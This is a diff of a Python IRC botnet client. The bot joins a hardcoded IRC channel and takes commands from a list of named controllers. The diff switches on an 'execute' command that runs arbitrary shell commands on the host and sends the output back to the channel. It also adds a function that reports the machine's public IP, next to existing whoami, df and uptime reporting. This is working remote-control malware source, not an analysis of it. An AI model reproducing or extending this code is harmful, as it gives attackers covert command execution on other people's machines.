@@ -4,10 +4,7 @@
 #Blizzo
 
 #to do list
-#fix system call to allow spaces
-#implement public IP
 #make more cross-platform instead of just for linux
-#enable directive one liners
 #handle reconnecting if server restarts or there is some connection error
 
 import socket
@@ -24,13 +21,23 @@ import subprocess as sub
 from sys import argv
 from random import randint
 
-def genNick(os):
+def generateNick(os):
 	rannum = str(randint(0000, 9999))
 	return str(os[:3] + rannum)
 
 def execute(cmd):
-	p = sub.Popen(cmd,stdout=sub.PIPE,stderr=sub.PIPE)
-	output, errors = p.communicate()
+
+	#handling a multi-word command
+	cmdList = []
+	if (cmd.find(" ") != -1):
+		cmdList = cmd.split(" ")
+		p = sub.Popen(cmdList,stdout=sub.PIPE,stderr=sub.PIPE)
+		output, errors = p.communicate()
+
+	#handles a 1-liner
+	else:
+		p = sub.Popen(cmd,stdout=sub.PIPE,stderr=sub.PIPE)
+		output, errors = p.communicate()
 
 	#handling multi-line output
 	lines = []
@@ -62,36 +69,41 @@ def sendData(data):
 
 #All of the possible functions that the botnet is capable of
 def reply(): #send back to IRC server that you are here
-	irc.send('PRIVMSG ' + channel + " :Yes I am here" + '\r\n')
+	sendData("Yes I am here")
 
 def whoAmI(): #execute whoami command and send output
 	output  = execute("whoami")
 	sendData(output)
 
 def iAmGood(): #send back to IRC server that you are good
-	irc.send('PRIVMSG ' + channel + " :I am good. And you?" + '\r\n')
+	sendData("I am good. And you?")
 
 def runAndSend(cmd): #take a single command, run it, return output
-	output = execute(cmd)
-	sendData(output)
+	cmd = cmd[8:]#have to get rid of the "execute" in front
+	request = execute(cmd)
+	sendData(request)
 
 def getAge(): #send uptime
-	irc.send('PRIVMSG ' + channel + " :I don't know how to do that yet boss." + '\r\n')
+	sendData("I don't know how to do that yet boss.")
 
 def terminate(): #terminate program and send goodbye message
-	irc.send('PRIVMSG ' + channel + " :Oh no! We better find some cover." + '\r\n')
+	sendData("Oh no! We better find some cover.")
 	exit()
 
 def freeSpace():
-	output = execute("df")
-	sendData(output)
+	request = execute("df")
+	sendData(request)
 
 def uptime():
-	output = execute("uptime")
-	sendData(output)
+	request = execute("uptime")
+	sendData(request)
 
-def info():
+def version():
 	sendData(platform.release())
+
+def getIP():
+	request = execute("curl icanhazip.com")
+	sendData(request)
 
 #debugger
 DEBUG = 0
@@ -108,9 +120,9 @@ admins = ["king", "samorizu", "blackbear", "bigshebang"]
 server = "leagueachieve.info"
 port = 6667
 channel = "#lobby"
-botnick = genNick(os)
+nick = generateNick(os)
 
-print "The botnick is:", botnick
+print "The botnick is:", nick
 
 #dictionary of functions
 commands = {
@@ -119,15 +131,16 @@ commands = {
 	"who are you" : whoAmI,
 	"how old are you" : getAge,
 	"zombie apocalypse" : terminate,
-	# "execute" : runAndSend,
+	"execute" : runAndSend,
 	"free" : freeSpace,
 	"uptime" : uptime,
-	"info" : info
+	"version" : version,
+	"what is your ip" : getIP
 }
 
 #MAYBE have syntax like this '??botname: interactive' or '??botname: commands'
 	#interactive would be the interactive shell while commands would be just listen to 
-#or just allow one liners to bots like 'botnick: command'
+#or just allow one liners to bots like 'nick: command'
 #allow controller to tell singular bots or all bots to return output of command or success/failure only
 
 #interactive shell details - 
@@ -139,7 +152,7 @@ commands = {
 
 #function which parses the command and determines how to handle it
 def parseCommand(command):
-	if not DEBUG:
+	if DEBUG:
 		print "command is '%s'" % command
 		print "interact 0: " + str(not INTERACT[0])
 		print "interact 1: " + str(not INTERACT[1])
@@ -152,10 +165,10 @@ def parseCommand(command):
 			return
 
 		header = command[:command.index("PRIVMSG")] #get everything before PRIVMSG
-		print "1header is: '%s'" % header #print
+		#print "1header is: '%s'" % header #print
 		if ":" in header: #check if there is a colon first, to avoid crashing
 			header = header[(header.index(":") + 1):] #get all after colon
-		print "2header is: '%s'" % header
+		#print "2header is: '%s'" % header
 		# lines = header.split(":")
 		# elif len(lines) > 1:
 		# 	header = lines[1] #get all after colon
@@ -180,13 +193,17 @@ def parseCommand(command):
 
 			print "Recieved %s from the CNC" % command #print command
 
+			#implementation of directive commands
+			if (command[:7] == "execute"):
+				runAndSend(command)
+
 			if INTERACT[0]: #if interactive shell is on
 				if "??finish" in command:
 					INTERACT[0] = 0
 					return
 				elif "??-" in command:
 					users = command[3:].split(" ")
-					if botnick in users or "all" in users:
+					if nick in users or "all" in users:
 						INTERACT[1] = 0
 
 					return
@@ -204,7 +221,7 @@ def parseCommand(command):
 				for user in users:
 					print "user is '%s'" % user
 
-				if not botnick in users and not "all" in users:
+				if not nick in users and not "all" in users:
 					INTERACT[1] = 0
 					return
 			else:
@@ -227,7 +244,7 @@ def parseCommand(command):
 				INTERACT[1] = 1
 			elif "??+" in command:
 				users = command[3:].split(" ")
-				if botnick in users or "all" in users:
+				if nick in users or "all" in users:
 					INTERACT[1] = 1
 
 
@@ -235,8 +252,8 @@ def parseCommand(command):
 irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creates socket
 print "connecting to: "+server
 irc.connect((server, port)) #connects to the server
-irc.send("USER "+ botnick +" "+ botnick +" "+ botnick +" :This is a fun bot!\n") #user authentication
-irc.send("NICK "+ botnick +"\n") #sets nick
+irc.send("USER "+ nick +" "+ nick +" "+ nick +" :This is a fun bot!\n") #user authentication
+irc.send("NICK "+ nick +"\n") #sets nick
 
 temp=irc.recv(1024) #get response to setting nick
 if DEBUG:
@@ -244,11 +261,11 @@ if DEBUG:
 
 counter = 2
 while "nickname already in use" in temp.lower():
-	botnick = botnick + "-" + str(counter)
-	if len(botnick) > 9: #if nick gets too long, generate new number and reset counter; try again
-		botnick = genNick(os)
+	nick = nick + "-" + str(counter)
+	if len(nick) > 9: #if nick gets too long, generate new number and reset counter; try again
+		nick = generateNick(os)
 		counter = 2
-	irc.send("NICK " + botnick + "\n") #sets nick
+	irc.send("NICK " + nick + "\n") #sets nick
 	temp=irc.recv(1024) #get response to setting nick
 	if DEBUG:
 		print "text received: '%s'\niteration %d" % (temp, counter)
